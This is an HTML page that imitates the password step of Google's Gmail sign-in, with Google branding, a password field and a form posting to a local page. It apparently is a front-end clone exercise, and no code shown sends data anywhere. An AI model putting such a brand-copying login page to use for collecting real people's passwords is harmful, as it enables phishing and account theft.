<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Gmail</title>
</head>

<body>
    <section class="login">
        <div class="login-container ">
            <div class="login-content border">
                <div class="login-header">
                    <div class="logo">
                        <img src="./images/google-logo.png" alt="Google Logo">
                    </div>
                    <div class="login-taglines">
                        <div class="login-headings">
                            <h3>Welcome</h3>
                        </div>
                        <div class="login-link">
                            <a href="login.html">
                                <div class="login-mail-link">
                                    <div class="mail-icon">
                                        <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false"
                                            width="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                            <path
                                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z">
                                            </path>
                                        </svg>
                                    </div>
                                    <div class="mail-name">
                                        <p id="mail-name"></p>
                                    </div>
                                    <div class="down-arrow">
                                        <svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false"
                                            width="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                            <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71">
                                            </polygon>
                                        </svg>
                                    </div>
                                </div>
                            </a>
                        </div>
                    </div>

                </div>
                <div class="signup-forms">
                    <form action="welcome.html" method="post" name="passForm">
                        <div class="input-box w-100" onchange="isActive()">
                            <input type="password" class="input login-input" name="pass" id="pass">
                            <label for="pass" class="input-label login-label">Enter your password</label>
                            <span id="pass-error"></span>
                        </div>
                        <div class="input-box input-check">
                            <div class="checkbox">
                                <input type="checkbox" name="checkbox" id="checkbox" onchange="showPass()"
                                    width="100px">
                                <p class="check-text">Show Password</p>
                            </div>
                        </div> 
                        <div class="form-bottom">
                            <div class="link-btn">
                                <a href="signup.html">Forgot Password</a>
                            </div>
                            <div class="input-btn">
                                <button type="submit" onclick="passSubmit()">Next</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>
</body>
<script src="js/script.js"></script>
<script src="js/auth.js"></script>
<script src="js/validation.js"></script>

</html>
